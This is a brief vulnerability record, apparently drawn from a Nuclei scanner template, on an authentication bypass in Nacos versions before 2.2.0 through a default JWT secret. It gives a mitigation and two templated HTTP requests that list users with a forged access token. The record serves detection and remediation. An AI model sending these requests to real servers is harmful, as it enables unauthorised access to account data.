# Vulnerability: Nacos < 2.2.0 - Authentication Bypass
**Classification:** AUTH-BYPASS
**Source:** Nuclei Template (`nacos-authentication-bypass.yaml`)

## Description
The authentication function of Nacos is can be bypass through default JWT secret.

## Secure Mitigation
Change value of jwt secret in the configurations

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}
GET {{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}
```

